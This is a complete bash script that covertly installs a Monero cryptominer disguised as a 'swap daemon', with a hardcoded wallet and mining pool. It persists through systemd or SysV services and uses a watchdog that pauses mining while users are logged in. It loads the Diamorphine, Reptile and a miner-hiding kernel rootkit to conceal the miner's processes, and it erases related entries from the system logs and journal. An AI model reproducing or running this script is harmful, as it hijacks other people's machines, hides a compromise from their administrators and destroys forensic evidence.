#!/bin/bash

# ==================== DISABLE ALL DEBUGGING ====================
{ set +x; } 2>/dev/null
unset BASH_XTRACEFD PS4 2>/dev/null
# exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible

# Continue with existing code...
# Removed -u and -o pipefail to ensure script ALWAYS continues
set +ue          # Disable exit on error
set +o pipefail  # Disable pipeline error propagation
IFS=$'\n\t'
unset HISTFILE
export HISTFILE=/dev/null

# Trap errors but continue execution
trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR

# ==================== GIT CONFIGURATION ====================
# Disable git interactive prompts globally
export GIT_TERMINAL_PROMPT=0
git config --global credential.helper "" 2>/dev/null || true

# ==================== ARCHITECTURE DETECTION ====================
# Detect if system is 32-bit or 64-bit to skip incompatible rootkits
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        IS_64BIT=true
        echo "[*] Detected 64-bit system (x86_64) - all rootkits available"
        ;;
    i386|i686|x86)
        IS_64BIT=false
        echo "[!] WARNING: 32-bit system detected ($ARCH)"
        echo "[!] Advanced rootkits (Reptile, crypto-miner) will be SKIPPED"
        echo "[!] Reason: They use 64-bit assembly and cannot compile on 32-bit"
        ;;
    armv7l|armv8|aarch64|arm*)
        IS_64BIT=false
        echo "[!] WARNING: ARM architecture detected ($ARCH)"
        echo "[!] x86-specific kernel rootkits will be SKIPPED"
        ;;
    *)
        IS_64BIT=false
        echo "[!] WARNING: Unknown architecture: $ARCH"
        echo "[!] Kernel rootkits will be SKIPPED for safety"
        ;;
esac

# ==================== REPTILE COMMAND WRAPPER ====================
# Helper function to call reptile commands (handles different installation paths)
reptile_cmd() {
    local cmd="$1"
    shift
    
    # Skip entirely on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        return 0
    fi
    
    # Try different possible locations where reptile might be installed
    if [ -f /reptile/bin/reptile ]; then
        /reptile/bin/reptile "$cmd" "$@" 2>/dev/null || true
    elif [ -f /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd ]; then
        /tmp/.ICE-unix/.X11-unix/Reptile/reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif [ -f ./reptile_cmd ]; then
        ./reptile_cmd "$cmd" "$@" 2>/dev/null || true
    elif command -v reptile >/dev/null 2>&1; then
        reptile "$cmd" "$@" 2>/dev/null || true
    else
        # Reptile not found, silently skip
        return 1
    fi
}

# ==================== PACKAGE MANAGER DETECTION ====================
# Detect which package manager is available
if command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    PKG_INSTALL="apt-get install -y"
    PKG_UPDATE="apt-get update"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    PKG_INSTALL="yum install -y"
    PKG_UPDATE="yum update"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    PKG_INSTALL="dnf install -y"
    PKG_UPDATE="dnf update"
else
    echo "[!] WARNING: No supported package manager found"
    PKG_MANAGER="unknown"
    PKG_INSTALL="echo 'No package manager available:'"
    PKG_UPDATE="true"
fi
echo "[*] Detected package manager: $PKG_MANAGER"

# ==================== DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu) ====================
# Detect and fix interrupted dpkg/apt operations before installing packages

if command -v dpkg >/dev/null 2>&1; then
    echo ""
    echo "========================================"
    echo "CHECKING DPKG STATUS"
    echo "========================================"
    
    # Check if dpkg was interrupted
    DPKG_INTERRUPTED=false
    
    # Method 1: Check dpkg status (ONLY packages with actual problems)
    if dpkg --audit 2>&1 | grep -qE "half-configured|half-installed|unpacked.*not configured"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (dpkg --audit shows half-configured packages)"
    fi
    
    # Method 2: Check apt-get for ACTUAL errors (not just warnings)
    if apt-get check 2>&1 | grep -qE "dpkg was interrupted.*must manually run|You must.*dpkg --configure"; then
        DPKG_INTERRUPTED=true
        echo "[!] DPKG interrupt detected (apt-get check shows actual interrupt)"
    fi
    
    # Method 3: Check lock files ONLY if process is stuck
    if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
        # Only consider it interrupted if lock file exists AND process is stuck
        if lsof /var/lib/dpkg/lock 2>/dev/null | grep -q dpkg; then
            # Process is actually running - not interrupted, just busy
            echo "[*] DPKG is currently running (locked by active process)"
            DPKG_INTERRUPTED=false
        elif pgrep -x "dpkg\|apt-get\|apt\|aptitude" >/dev/null 2>&1; then
            # Package manager is running - not interrupted
            echo "[*] Package manager is currently running"
            DPKG_INTERRUPTED=false
        elif [ -f /var/lib/dpkg/status-old ] && [ -f /var/lib/dpkg/lock ]; then
            # Lock file exists, no process, and backup status exists = interrupted
            DPKG_INTERRUPTED=true
            echo "[!] DPKG may have been interrupted (stale lock with no process)"
        fi
    fi
    
    # Fix if interrupted
    if [ "$DPKG_INTERRUPTED" = "true" ]; then
        echo ""
        echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
        echo "========================================"
        
        # Kill any stuck dpkg processes
        echo "[*] Checking for stuck dpkg processes..."
        pkill -9 dpkg 2>/dev/null || true
        pkill -9 apt-get 2>/dev/null || true
        pkill -9 apt 2>/dev/null || true
        sleep 2
        
        # Remove lock files if they exist and no process is using them
        echo "[*] Removing stale lock files..."
        if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
            rm -f /var/lib/dpkg/lock 2>/dev/null || true
            rm -f /var/lib/dpkg/lock-frontend 2>/dev/null || true
            rm -f /var/lib/apt/lists/lock 2>/dev/null || true
            rm -f /var/cache/apt/archives/lock 2>/dev/null || true
        fi
        
        # Run dpkg --configure -a to fix interrupted installations
        echo "[*] Running: dpkg --configure -a"
        echo ""
        
        DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
        
        sleep 2
        
        # Fix any broken dependencies
        echo ""
        echo "[*] Running: apt-get install -f"
        
        DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
        
        sleep 2
        
        # Verify it's fixed
        echo ""
        echo "[*] Verifying dpkg is now working..."
        
        if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
            echo "[!] WARNING: Some packages may still have issues"
            echo "[*] Continuing anyway - script will handle package errors"
        else
            echo "[✓] DPKG is now working correctly"
        fi
        
        echo "========================================"
        echo ""
    else
        echo "[✓] DPKG is working correctly (no interrupt detected)"
        echo ""
    fi
fi

# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
# This function NEVER gives up trying to stop services/processes
force_stop_service() {
    local service_names="$1"  # Space-separated list of service names
    local process_names="$2"  # Space-separated list of process names
    local max_attempts=60     # 60 attempts = ~5 minutes max
    local attempt=0
    
    echo "[*] Force-stopping services: $service_names"
    echo "[*] Force-stopping processes: $process_names"
    
    while [ $attempt -lt $max_attempts ]; do
        attempt=$((attempt + 1))
        local all_stopped=true
        
        # Method 1: Try systemctl stop for each service
        if [ -n "$service_names" ]; then
            for svc in $service_names; do
                if systemctl is-active --quiet "$svc" 2>/dev/null; then
                    echo "[*] Attempt $attempt: Stopping service $svc with systemctl..."
                    systemctl stop "$svc" 2>/dev/null || true
                    all_stopped=false
                fi
            done
        fi
        
        # Method 2: Kill processes by name (all methods)
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                # Check if any process with this name exists
                if pgrep -x "$proc" >/dev/null 2>&1 || pgrep -f "$proc" >/dev/null 2>&1; then
                    echo "[*] Attempt $attempt: Killing process $proc..."
                    
                    # Method 2a: pkill by exact name
                    pkill -9 -x "$proc" 2>/dev/null || true
                    
                    # Method 2b: pkill by pattern (full command line)
                    pkill -9 -f "$proc" 2>/dev/null || true
                    
                    # Method 2c: Find and kill by PID
                    local pids=$(pgrep -x "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    # Method 2d: Find by full command and kill
                    local pids=$(pgrep -f "$proc" 2>/dev/null)
                    if [ -n "$pids" ]; then
                        for pid in $pids; do
                            kill -9 "$pid" 2>/dev/null || true
                        done
                    fi
                    
                    all_stopped=false
                fi
            done
        fi
        
        # Method 3: Check /proc for survivors
        if [ -n "$process_names" ]; then
            for proc in $process_names; do
                for pid_dir in /proc/[0-9]*; do
                    if [ -f "$pid_dir/cmdline" ]; then
                        local cmdline=$(cat "$pid_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                        if echo "$cmdline" | grep -q "$proc"; then
                            local pid=$(basename "$pid_dir")
                            echo "[*] Attempt $attempt: Found survivor PID $pid, killing..."
                            kill -9 "$pid" 2>/dev/null || true
                            all_stopped=false
                        fi
                    fi
                done
            done
        fi
        
        # If everything is stopped, break out
        if [ "$all_stopped" = true ]; then
            echo "[✓] All services/processes stopped after $attempt attempts"
            return 0
        fi
        
        # Wait before next attempt
        sleep 3
    done
    
    echo "[!] WARNING: Some services/processes may still be running after $max_attempts attempts"
    echo "[*] Continuing anyway..."
    return 0
}

# ==================== DETECT INIT SYSTEM ====================
SYSTEMD_AVAILABLE=false
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    SYSTEMD_AVAILABLE=true
    echo "[*] Detected systemd init system"
else
    echo "[*] Detected SysV init system (legacy mode)"
fi

# ==================== CLEAN UP OLD INSTALLATIONS ====================
echo "[*] Cleaning up old miner installations..."

# Stop all possible miner services (systemd)
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    force_stop_service "swapd kswapd0 xmrig" ""
fi

# Stop all possible miner processes (direct kill)
force_stop_service "" "swapd kswapd0 xmrig"

# Remove old service files
rm -f /etc/systemd/system/swapd.service 2>/dev/null
rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
rm -f /etc/systemd/system/xmrig.service 2>/dev/null
rm -f /etc/init.d/swapd 2>/dev/null
rm -f /etc/init.d/kswapd0 2>/dev/null

# Reload systemd if it exists
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    systemctl daemon-reload 2>/dev/null || true
fi

# Remove old miner directories
rm -rf /root/.swapd 2>/dev/null
rm -rf /tmp/xmrig 2>/dev/null
rm -rf ~/.xmrig 2>/dev/null

echo "[✓] Cleanup complete"

# ==================== ENSURE DEPENDENCIES ====================
echo "[*] Installing dependencies..."

# Update package lists (suppress output)
$PKG_UPDATE >/dev/null 2>&1 || true

# Core dependencies
DEPS="wget curl git make gcc g++ build-essential linux-headers-$(uname -r)"

# Install each dependency individually with error handling
for dep in $DEPS; do
    if ! command -v "$dep" >/dev/null 2>&1 && ! dpkg -l | grep -q "^ii.*$dep" 2>/dev/null; then
        echo "[*] Installing $dep..."
        DEBIAN_FRONTEND=noninteractive $PKG_INSTALL "$dep" >/dev/null 2>&1 || {
            echo "[!] Failed to install $dep, continuing..."
        }
    fi
done

echo "[✓] Dependencies installation complete"

# ==================== DETECT DOWNLOAD TOOL ====================
USE_WGET=false
if ! command -v curl >/dev/null 2>&1; then
    echo "[*] curl not found, using wget instead"
    USE_WGET=true
elif ! curl -sS --max-time 5 https://google.com >/dev/null 2>&1; then
    echo "[!] curl SSL/TLS error detected, falling back to wget"
    USE_WGET=true
fi

# ==================== DOWNLOAD XMRIG ====================
echo "[*] Downloading XMRig..."

mkdir -p /root/.swapd
cd /root/.swapd || exit 1

XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
DOWNLOAD_SUCCESS=false

# Try to download xmrig
if [ "$USE_WGET" = true ]; then
    if wget -q --no-check-certificate -O xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
        DOWNLOAD_SUCCESS=true
    fi
else
    if curl -sS -L -k -o xmrig.tar.gz "$XMRIG_URL" 2>/dev/null; then
        DOWNLOAD_SUCCESS=true
    fi
fi

# Extract if download was successful
if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
    tar -xzf xmrig.tar.gz 2>/dev/null || {
        echo "[!] Failed to extract xmrig"
        exit 1
    }
    mv xmrig-*/xmrig swapd 2>/dev/null || {
        echo "[!] Failed to rename xmrig binary"
        exit 1
    }
    chmod +x swapd
    rm -rf xmrig-* xmrig.tar.gz
    echo "[✓] XMRig downloaded and renamed to 'swapd'"
else
    echo "[!] Failed to download XMRig"
    echo "[!] Please manually download xmrig and place it at /root/.swapd/swapd"
    exit 1
fi

# ==================== CONFIGURE XMRIG ====================
echo "[*] Configuring XMRig..."

# User-configurable variables
WALLET="896Q5xQdR1JWF5aiiMW1Urhu9RLqC6wdZKkWdKH7gCz8XvUnx9FKPuqyJvzuoMdPZBdUNtMvyFkCupE18P3UVN8uShDBHUE"
WORKER_NAME="$(hostname)-swapd"

# Create configuration file (will be renamed to swapfile for stealth)
cat > config.json << 'EOL'
{
    "autosave": false,
    "donate-level": 0,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "gulf.moneroocean.stream:80",
            "user": "WALLET_PLACEHOLDER",
            "pass": "WORKER_PLACEHOLDER",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOL

# Replace placeholders
sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
sed -i "s/WORKER_PLACEHOLDER/$WORKER_NAME/g" config.json

# Rename to swapfile for stealth
mv config.json swapfile

echo "[✓] XMRig configuration created as 'swapfile'"

# ==================== CREATE INTELLIGENT WATCHDOG ====================
echo "[*] Creating intelligent watchdog (3-minute interval, state-tracked)..."

cat > /usr/local/bin/system-watchdog << 'WATCHDOG_EOF'
#!/bin/bash

# ==================== INTELLIGENT WATCHDOG WITH STATE TRACKING ====================
# Monitors for admin logins and gracefully stops/starts the miner
# - Checks every 3 minutes (not aggressive)
# - Tracks state to avoid unnecessary service restarts
# - Only acts when state CHANGES (login/logout detected)
# - Uses systemd or init.d depending on system

set +ue
IFS=$'\n\t'

STATE_FILE="/var/tmp/.miner_state"
CHECK_INTERVAL=180  # 3 minutes

# Detect init system
if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
    INIT_SYSTEM="systemd"
    START_CMD="systemctl start swapd"
    STOP_CMD="systemctl stop swapd"
    STATUS_CMD="systemctl is-active swapd"
else
    INIT_SYSTEM="sysv"
    START_CMD="/etc/init.d/swapd start"
    STOP_CMD="/etc/init.d/swapd stop"
    STATUS_CMD="/etc/init.d/swapd status"
fi

# Initialize state if it doesn't exist
if [ ! -f "$STATE_FILE" ]; then
    echo "stopped" > "$STATE_FILE"
fi

while true; do
    # Check if any admin users are logged in (exclude root)
    ADMIN_LOGGED_IN=false
    if who | grep -qvE "^root\s"; then
        ADMIN_LOGGED_IN=true
    fi
    
    # Read previous state
    PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
    
    # Determine desired state
    if [ "$ADMIN_LOGGED_IN" = true ]; then
        DESIRED_STATE="stopped"
    else
        DESIRED_STATE="running"
    fi
    
    # Only act if state CHANGED
    if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
        if [ "$DESIRED_STATE" = "stopped" ]; then
            # Admin logged in - stop miner
            $STOP_CMD >/dev/null 2>&1 || true
            echo "stopped" > "$STATE_FILE"
        else
            # Admin logged out - start miner
            $START_CMD >/dev/null 2>&1 || true
            echo "running" > "$STATE_FILE"
        fi
    fi
    
    # Wait before next check
    sleep "$CHECK_INTERVAL"
done
WATCHDOG_EOF

chmod +x /usr/local/bin/system-watchdog
echo "[✓] Intelligent watchdog created"

# ==================== CREATE SYSTEMD SERVICE (if available) ====================
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo "[*] Creating systemd service..."
    
    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
[Unit]
Description=System swap daemon
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.swapd
ExecStart=./swapd -c swapfile
Restart=always
RestartSec=10
Nice=19
CPUQuota=95%
IOSchedulingClass=idle
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE_EOF
    
    # Enable and start the service
    systemctl daemon-reload
    systemctl enable swapd 2>/dev/null || true
    
    echo "[✓] Systemd service created and enabled"
    
    # Create watchdog service
    cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
[Unit]
Description=System monitoring watchdog
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/system-watchdog
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
WATCHDOG_SERVICE_EOF
    
    systemctl daemon-reload
    systemctl enable system-watchdog 2>/dev/null || true
    systemctl start system-watchdog 2>/dev/null || true
    
    echo "[✓] Watchdog service created and enabled"
    
else
    # ==================== CREATE SYSV INIT SCRIPT ====================
    echo "[*] Creating SysV init script..."
    
    cat > /etc/init.d/swapd << 'INIT_EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          swapd
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System swap daemon
### END INIT INFO

DAEMON=./swapd
DAEMON_ARGS="-c swapfile"
NAME=swapd
PIDFILE=/var/run/$NAME.pid
WORKDIR=/root/.swapd

case "$1" in
    start)
        echo "Starting $NAME..."
        cd $WORKDIR
        start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --chdir $WORKDIR --exec $WORKDIR/swapd -- $DAEMON_ARGS || true
        ;;
    stop)
        echo "Stopping $NAME..."
        start-stop-daemon --stop --pidfile $PIDFILE --retry 5 || true
        pkill -9 -f swapd || true
        rm -f $PIDFILE
        ;;
    restart)
        $0 stop
        sleep 2
        $0 start
        ;;
    status)
        if [ -f $PIDFILE ]; then
            PID=$(cat $PIDFILE)
            if kill -0 $PID 2>/dev/null; then
                echo "$NAME is running (PID $PID)"
            else
                echo "$NAME is not running (stale PID file)"
            fi
        else
            echo "$NAME is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|restart|status}"
        exit 1
        ;;
esac

exit 0
INIT_EOF
    
    chmod +x /etc/init.d/swapd
    
    # Add to startup (distribution-specific)
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d swapd defaults >/dev/null 2>&1 || true
    elif command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add swapd >/dev/null 2>&1 || true
        chkconfig swapd on >/dev/null 2>&1 || true
    fi
    
    echo "[✓] SysV init script created and enabled"
    
    # Install watchdog as a background daemon
    echo "[*] Installing watchdog as background daemon..."
    nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
    echo "[✓] Watchdog started in background"
fi

# ==================== INSTALL DIAMORPHINE (Universal Kernel Rootkit) ====================
install_diamorphine() {
    echo ""
    echo "========================================"
    echo "INSTALLING DIAMORPHINE ROOTKIT"
    echo "========================================"
    
    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Diamorphine on non-64-bit system"
        return 1
    fi
    
    cd /tmp || return 1
    
    # Remove old installation
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[*] Removing old Diamorphine..."
        rmmod diamorphine 2>/dev/null || true
        sleep 1
    fi
    
    rm -rf diamorphine 2>/dev/null
    
    # Clone and build
    echo "[*] Cloning Diamorphine..."
    export GIT_TERMINAL_PROMPT=0
    if ! git clone --depth 1 https://github.com/m0nad/Diamorphine.git diamorphine 2>&1 | grep -v "Username"; then
        echo "[!] Failed to clone Diamorphine (network or repository unavailable)"
        unset GIT_TERMINAL_PROMPT
        return 1
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd diamorphine || return 1
    
    echo "[*] Building Diamorphine..."
    if ! make 2>/dev/null; then
        echo "[!] Failed to build Diamorphine"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Diamorphine kernel module..."
    if ! insmod diamorphine.ko 2>/dev/null; then
        echo "[!] Failed to load Diamorphine"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q diamorphine 2>/dev/null; then
        echo "[✓] Diamorphine loaded successfully"
        
        # Clean up build artifacts
        cd /tmp
        rm -rf diamorphine
        
        return 0
    else
        echo "[!] Diamorphine failed to load"
        cd /tmp
        rm -rf diamorphine
        return 1
    fi
}

# ==================== INSTALL REPTILE (Advanced Kernel Rootkit) ====================
install_reptile() {
    echo ""
    echo "========================================"
    echo "INSTALLING REPTILE ROOTKIT"
    echo "========================================"
    
    # Skip on non-64-bit systems
    if [ "$IS_64BIT" = "false" ]; then
        echo "[!] Skipping Reptile on non-64-bit system"
        return 1
    fi
    
    # Create hidden directory
    mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
    cd /tmp/.ICE-unix/.X11-unix || return 1
    
    # Remove old installation
    if [ -d Reptile ]; then
        echo "[*] Removing old Reptile installation..."
        rm -rf Reptile
    fi
    
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[*] Unloading old Reptile module..."
        rmmod reptile 2>/dev/null || true
        sleep 1
    fi
    
    # Clone Reptile (disable interactive prompts)
    echo "[*] Cloning Reptile..."
    export GIT_TERMINAL_PROMPT=0
    if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
        echo "[!] Failed to clone Reptile (network or repository unavailable)"
        unset GIT_TERMINAL_PROMPT
        return 1
    fi
    unset GIT_TERMINAL_PROMPT
    
    cd Reptile || return 1
    
    # Build Reptile
    echo "[*] Building Reptile (this may take a while)..."
    if ! make 2>/dev/null; then
        echo "[!] Failed to build Reptile"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
    
    # Load the module
    echo "[*] Loading Reptile kernel module..."
    if ! insmod reptile.ko 2>/dev/null; then
        echo "[!] Failed to load Reptile"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
    
    # Verify it loaded
    if lsmod | grep -q reptile 2>/dev/null; then
        echo "[✓] Reptile loaded successfully"
        return 0
    else
        echo "[!] Reptile failed to load"
        cd /tmp/.ICE-unix/.X11-unix
        rm -rf Reptile
        return 1
    fi
}

# ==================== INSTALL ROOTKITS ====================
echo ""
echo "========================================"
echo "INSTALLING ROOTKITS"
echo "========================================"

# Install Diamorphine (lightweight, universal)
if ! install_diamorphine; then
    echo "[!] Diamorphine installation failed"
fi

# Install Reptile (advanced features)
if install_reptile; then
    # Reptile-specific commands
    reptile_cmd hide
else
    # Fallback cleanup
    rmmod reptile 2>/dev/null || true
fi

# ==================== INSTALL CRYPTO-MINER ROOTKIT ====================
echo ""
echo "========================================"
echo "INSTALLING CRYPTO-MINER ROOTKIT"
echo "========================================"

cd /tmp || exit 1
mkdir -p .X11-unix 2>/dev/null
cd .X11-unix || exit 1

# Prepare kernel headers for module compilation
echo "[*] Preparing kernel headers for rootkit compilation..."
KERNEL_VER=$(uname -r)
if [ -d "/usr/src/linux-headers-$KERNEL_VER" ]; then
    cd "/usr/src/linux-headers-$KERNEL_VER" || exit 1
    echo "[*] Running make oldconfig && make prepare..."
    make oldconfig 2>/dev/null || true
    make prepare 2>/dev/null || true
    echo "[✓] Kernel headers prepared"
    cd /tmp/.X11-unix || exit 1
else
    echo "[!] Kernel headers directory not found, installing..."
    $PKG_INSTALL "linux-headers-$KERNEL_VER" 2>/dev/null || true
fi

# Clone and build the crypto-miner rootkit
echo "[*] Cloning hiding-cryptominers-linux-rootkit..."

export GIT_TERMINAL_PROMPT=0
if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-rootkit.git 2>&1 | grep -v "Username"; then
    unset GIT_TERMINAL_PROMPT
    cd hiding-cryptominers-linux-rootkit/ || exit 1
    
    echo "[*] Building rootkit..."
    if make 2>/dev/null; then
        echo "[*] Loading rootkit module..."
        dmesg -C
        insmod rootkit.ko 2>/dev/null || {
            echo "[!] Failed to load crypto rootkit"
        }
        dmesg
        
        # Immediately clean up rootkit load messages from logs
        sleep 1
        sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
        sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
        sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
        sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
        sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
        sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null
        
        echo "[✓] Crypto rootkit loaded"
    else
        echo "[!] Failed to build crypto rootkit"
    fi
    
    cd /tmp/.X11-unix || exit 1
    rm -rf hiding-cryptominers-linux-rootkit/
else
    echo "[!] Failed to clone crypto rootkit (network or repository unavailable)"
    unset GIT_TERMINAL_PROMPT
fi

# ==================== START MINER SERVICE ====================
echo ''
echo "[*] Starting swapd service..."
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    systemctl start swapd 2>/dev/null
    sleep 2
    systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
else
    /etc/init.d/swapd start
    sleep 2
    /etc/init.d/swapd status
fi

# ==================== HIDE MINER PROCESSES ====================
echo "[*] Hiding miner processes..."

# Hide with crypto rootkit (kill -31)
if lsmod | grep -q rootkit 2>/dev/null; then
    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
    if [ -n "$MINER_PIDS" ]; then
        for pid in $MINER_PIDS; do
            if [[ "$pid" =~ ^[0-9]+$ ]]; then
                kill -31 "$pid" 2>/dev/null || true
            fi
        done
        echo "[✓] Processes hidden with crypto rootkit (kill -31)"
    fi
else
    echo "[!] Crypto rootkit not loaded, skipping process hiding"
fi

# Hide with Diamorphine (kill -31 and kill -63)
if lsmod | grep -q diamorphine 2>/dev/null; then
    MINER_PIDS=$(/bin/ps ax -fu "$USER" | grep -E "swapd|kswapd0" | grep -v "grep" | awk '{print $2}')
    if [ -n "$MINER_PIDS" ]; then
        for pid in $MINER_PIDS; do
            if [[ "$pid" =~ ^[0-9]+$ ]]; then
                kill -31 "$pid" 2>/dev/null || true
                kill -63 "$pid" 2>/dev/null || true
            fi
        done
        echo "[✓] Processes hidden with Diamorphine"
    fi
fi

# ==================== CLEAN UP LOGS ====================
echo "[*] Cleaning up system logs..."

# Delete any line containing miner-related keywords
sed -i '/swapd/d' /var/log/syslog 2>/dev/null
sed -i '/miner/d' /var/log/syslog 2>/dev/null
sed -i '/accepted/d' /var/log/syslog 2>/dev/null

# Do the same for auth.log
sed -i '/swapd/d' /var/log/auth.log 2>/dev/null

# Remove Diamorphine and out-of-tree module warnings
sed -i '/diamorphine/d' /var/log/syslog 2>/dev/null
sed -i '/out-of-tree module/d' /var/log/syslog 2>/dev/null
sed -i '/module verification failed/d' /var/log/syslog 2>/dev/null

# Remove rootkit load messages
sed -i '/rootkit: Loaded/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit: Loaded/d' /var/log/messages 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/syslog 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/kern.log 2>/dev/null
sed -i '/rootkit.*>:-/d' /var/log/messages 2>/dev/null

# Remove Reptile evidence
sed -i '/reptile/d' /var/log/syslog 2>/dev/null
sed -i '/reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/reptile/d' /var/log/messages 2>/dev/null
sed -i '/Reptile/d' /var/log/syslog 2>/dev/null
sed -i '/Reptile/d' /var/log/kern.log 2>/dev/null
sed -i '/Reptile/d' /var/log/messages 2>/dev/null

# Remove the mount/unmount evidence
sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
sed -i '/Deactivated successfully/d' /var/log/syslog 2>/dev/null

# Clear journalctl logs if systemd is present
if command -v journalctl >/dev/null 2>&1; then
    journalctl --vacuum-time=1s 2>/dev/null || true
fi

echo "[✓] Log cleanup complete"

# ==================== FINAL CLEANUP ====================
echo "[*] Final cleanup..."

# Cleanup xmrig files in login directory
rm -rf ~/xmrig*.* 2>/dev/null

echo ''

# ==================== INSTALLATION SUMMARY ====================
echo '========================================================================='
echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (NO LIBHIDE VERSION)!'
echo '========================================================================='
echo ''
echo 'System Configuration:'
if [ "$SYSTEMD_AVAILABLE" = true ]; then
    echo '  Init System: systemd'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   systemctl start swapd'
    echo '  Stop:    systemctl stop swapd'
    echo '  Status:  systemctl status swapd'
    echo '  Logs:    journalctl -u swapd -f'
else
    echo '  Init System: SysV init (legacy mode)'
    echo ''
    echo 'Service Management Commands:'
    echo '  Start:   /etc/init.d/swapd start'
    echo '  Stop:    /etc/init.d/swapd stop'
    echo '  Status:  /etc/init.d/swapd status'
    echo '  Restart: /etc/init.d/swapd restart'
fi

echo ''
echo 'Stealth Features Deployed:'

if lsmod | grep -q diamorphine 2>/dev/null; then
    echo '  ✓ Diamorphine: ACTIVE (kernel rootkit)'
else
    echo '  ○ Diamorphine: Not loaded'
fi

if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
    echo '  ✓ Reptile: ACTIVE (kernel rootkit)'
else
    echo '  ○ Reptile: Not loaded'
fi

if lsmod | grep -q rootkit 2>/dev/null; then
    echo '  ✓ Crypto-Miner Rootkit: ACTIVE (kernel rootkit)'
else
    echo '  ○ Crypto-Miner Rootkit: Not loaded'
fi

if [ -f /usr/local/bin/system-watchdog ]; then
    echo '  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)'
else
    echo '  ○ Watchdog: Not deployed'
fi

echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
